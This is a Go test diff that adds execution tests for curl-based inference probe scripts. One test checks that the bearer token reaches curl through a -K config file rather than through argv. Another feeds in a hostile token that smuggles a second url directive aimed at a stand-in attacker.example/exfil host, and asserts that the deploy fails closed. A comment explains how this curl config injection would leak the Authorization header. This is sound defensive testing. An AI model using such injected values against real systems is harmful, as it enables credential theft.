@@ -166,3 +166,103 @@ func TestCodexInferenceProbe_HostileHostFailsClosed(t *testing.T) {
 		t.Fatalf("the probe must never contact an injected endpoint, called %q", url)
 	}
 }
+
+// TestInferenceProbes_AuthHeaderActuallyArrives is the execution test the
+// shape assertions could not be: every other check on the -K change is a
+// strings.Contains on the script text, and the stub curl in the other tests
+// ignores its arguments entirely.
+//
+// A wrong keyword or a missing quote in the config file would ship an
+// UNAUTHENTICATED request, which the gateway answers 401 — surfacing as a
+// spurious "auth" diagnosis on every deploy of that runtime, pointing the
+// operator at a credential that is perfectly fine. Claude has no other exec
+// coverage of this path at all.
+func TestInferenceProbes_AuthHeaderActuallyArrives(t *testing.T) {
+	requireSh(t)
+
+	for _, tc := range []struct{ name, script, env, token string }{
+		{"codex", codexInferenceProbeScript(), codexProbeEnv("https://ex.databricks.com"), "dapi-test"},
+		{"claude", claudeInferenceProbeScript(),
+			"export ANTHROPIC_BASE_URL=https://gw.example/v1\nexport ANTHROPIC_AUTH_TOKEN=dapi-claude-test\n", "dapi-claude-test"},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			home := t.TempDir()
+			argvFile := filepath.Join(home, "argv.txt")
+			hdrFile := filepath.Join(home, "hdr.txt")
+			// Record argv, and resolve whatever -K file curl was handed so
+			// we can assert the header is really in it.
+			stub := "#!/bin/sh\n" +
+				"printf '%s\\n' \"$*\" > " + argvFile + "\n" +
+				"prev=''\nfor a in \"$@\"; do if [ \"$prev\" = \"-K\" ]; then cat \"$a\" > " + hdrFile + "; fi; prev=\"$a\"; done\n" +
+				"printf '%s' 200\n"
+			if err := os.WriteFile(filepath.Join(home, "curl"), []byte(stub), 0o755); err != nil {
+				t.Fatal(err)
+			}
+
+			cmd := exec.Command("sh", "-c", tc.script)
+			cmd.Stdin = strings.NewReader(tc.env)
+			cmd.Env = []string{"HOME=" + home, "PATH=" + home + ":" + os.Getenv("PATH")}
+			if err := cmd.Run(); err != nil {
+				t.Fatalf("probe should succeed on HTTP 200: %v", err)
+			}
+
+			argv, _ := os.ReadFile(argvFile)
+			if strings.Contains(string(argv), tc.token) {
+				t.Errorf("token appears in curl argv, readable via /proc: %s", argv)
+			}
+			hdr, err := os.ReadFile(hdrFile)
+			if err != nil {
+				t.Fatalf("probe did not hand curl a -K config file: %v", err)
+			}
+			want := `header = "Authorization: Bearer ` + tc.token + `"`
+			if !strings.Contains(string(hdr), want) {
+				t.Errorf("config file does not carry the auth header.\n got: %q\nwant: %q", hdr, want)
+			}
+		})
+	}
+}
+
+// TestInferenceProbes_HostileTokenFailsClosed pins the charset gate the -K
+// change made necessary. curl's config syntax treats a quote-newline as the
+// end of one directive and the start of the next, so a token containing one
+// can append a url directive — making curl issue a SECOND request that
+// replays the Authorization header and the request body to an endpoint of
+// the attacker's choosing. Verified against real curl 8.20 before the gate
+// was added.
+func TestInferenceProbes_HostileTokenFailsClosed(t *testing.T) {
+	requireSh(t)
+	hostile := "dapi-real\"\nurl = \"http://attacker.example/exfil"
+
+	for _, tc := range []struct{ name, script, env, marker string }{
+		{"codex", codexInferenceProbeScript(),
+			codexProbeEnv("https://ex.databricks.com"), codexProbeCauseMarkerPrefix},
+		{"claude", claudeInferenceProbeScript(),
+			"export ANTHROPIC_BASE_URL=https://gw.example/v1\n", claudeProbeCauseMarkerPrefix},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			home := t.TempDir()
+			if err := os.WriteFile(filepath.Join(home, "curl"), []byte("#!/bin/sh\nprintf '%s' 200\n"), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			// Override the token with the hostile value, after the env.
+			env := tc.env
+			if tc.name == "codex" {
+				env += "export DATABRICKS_TOKEN='" + hostile + "'\n"
+			} else {
+				env += "export ANTHROPIC_AUTH_TOKEN='" + hostile + "'\n"
+			}
+
+			cmd := exec.Command("sh", "-c", tc.script)
+			cmd.Stdin = strings.NewReader(env)
+			cmd.Env = []string{"HOME=" + home, "PATH=" + home + ":" + os.Getenv("PATH")}
+			var out bytes.Buffer
+			cmd.Stdout = &out
+			if err := cmd.Run(); err == nil {
+				t.Fatal("a token that can inject curl config directives must fail the deploy")
+			}
+			if cause := probeCause(out.String(), tc.marker); cause != "unset" {
+				t.Errorf("cause = %q, want \"unset\"", cause)
+			}
+		})
+	}
+}
